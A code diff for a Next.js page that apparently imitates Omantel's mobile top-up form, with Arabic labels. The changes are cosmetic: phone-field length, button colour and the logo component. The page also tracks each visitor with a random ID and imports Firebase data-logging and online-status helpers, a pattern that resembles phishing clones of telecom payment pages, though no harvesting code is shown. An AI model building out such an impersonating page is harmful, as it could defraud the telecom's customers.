@@ -19,6 +19,7 @@ import Link from "next/link"
 import { addData } from "@/lib/firebase"
 import { useEffect, useState } from "react"
 import { setupOnlineStatus } from "@/lib/utils"
+import { OmantelLogo } from "@/components/logo"
 const visitorId = `omn-app-${Math.random().toString(36).substring(2, 15)}`;
 
 export default function OmantelPage() {
@@ -109,7 +110,7 @@ export default function OmantelPage() {
               <label htmlFor="phone" className="text-sm font-medium text-gray-700 block">
                 أدخل رقم الهاتف المحمول
               </label>
-              <Input id="phone" onChange={(e)=>setPhone(e.target.value)} type="tel" dir="ltr" className="text-center" />
+              <Input id="phone" onChange={(e)=>setPhone(e.target.value)} type="tel" dir="ltr" className="text-center" maxLength={10} />
             </div>
 
             <div className="space-y-2">
@@ -123,7 +124,7 @@ export default function OmantelPage() {
               <p className="text-xs text-gray-400 text-center pt-1">الحد الأدنى ١ ر.ع - الحد الأقصى ١٠٠ ر.ع في اليوم</p>
             </div>
 
-            <Button type="submit" className="w-full bg-gray-300 hover:bg-gray-400 text-gray-800 font-bold">
+            <Button type="submit" className={`w-full ${phone.length > 8 ?" bg-orange-500 ":"bg-gray-500"} hover:bg-gray-400 text-white font-bold`}>
               تعبئة الرصيد
             </Button>
           </form>
@@ -144,9 +145,7 @@ export default function OmantelPage() {
                 <span>1235 مركز اتصال الشركات</span>
               </div>
             </div>
-            <div className="absolute -top-4 left-0 bg-blue-600 p-3 rounded-full shadow-lg">
-              <MessageSquare className="h-6 w-6 text-white" />
-            </div>
+          
           </div>
 
           <div className="grid grid-cols-2 md:grid-cols-4 gap-8 text-sm">
@@ -301,12 +300,3 @@ export default function OmantelPage() {
   )
 }
 
-function OmantelLogo(props: React.SVGProps<SVGSVGElement>) {
-  return (
-    <svg {...props} viewBox="0 0 100 20" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="Omantel">
-      <text x="0" y="15" fontFamily="Arial, sans-serif" fontSize="16" fontWeight="bold" fill="currentColor">
-        Omantel
-      </text>
-    </svg>
-  )
-}
